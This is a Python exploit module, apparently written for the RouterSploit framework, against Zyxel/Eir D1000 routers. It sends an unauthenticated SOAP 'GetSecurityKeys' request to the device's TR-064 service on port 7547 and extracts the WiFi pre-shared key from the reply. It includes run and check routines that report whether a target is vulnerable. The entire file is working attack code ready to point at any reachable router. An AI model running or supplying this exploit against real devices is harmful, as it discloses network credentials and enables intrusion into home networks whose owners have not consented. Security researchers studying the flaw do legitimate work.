# rsf exploit module
# description: Module exploits WiFi Password Disclosure vulnerability in Zyxel/Eir D1000 devices. If the target is vulnerable it allows to read WiFi password.

import requests
import re

class Exploit:
    __info__ = {
        "name": "Zyxel Eir D1000 WiFi Password Disclosure",
        "description": "Module exploits WiFi Password Disclosure vulnerability in Zyxel/Eir D1000 devices. If the target is vulnerable it allows to read WiFi password.",
        "authors": ("Xiphos http://www.xiphosresearch.com/", "Marcin Bury <marcin[at]threat9.com>"),
        "references": ("https://github.com/XiphosResearch/exploits/tree/master/tr-06fail",),
        "devices": ("Zyxel EIR D1000",),
    }

    def __init__(self, target, port=7547):
        self.target = target
        self.port = port

    def run(self):
        password = self.get_wifi_key()
        if password:
            print(f"Target seems to be vulnerable. WiFi Password: {password}")
        else:
            print("Target seems to be not vulnerable")

    def get_wifi_key(self):
        headers = {
            "SOAPAction": "urn:dslforum-org:service:WLANConfiguration:1#GetSecurityKeys"
        }
        data = """<?xml version="1.0"?>
                  <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                  <SOAP-ENV:Body>
                  <u:GetSecurityKeys xmlns:u="urn:dslforum-org:service:WLANConfiguration:1"></u:GetSecurityKeys>
                  </SOAP-ENV:Body>
                  </SOAP-ENV:Envelope>"""
        response = requests.post(f'http://{self.target}:{self.port}/UD/act?1', headers=headers, data=data)
        password = re.findall("<NewPreSharedKey>(.*?)</NewPreSharedKey>", response.text)
        if password:
            return password[0]
        return None

    def check(self):
        if self.get_wifi_key() is not None:
            return True
        return False

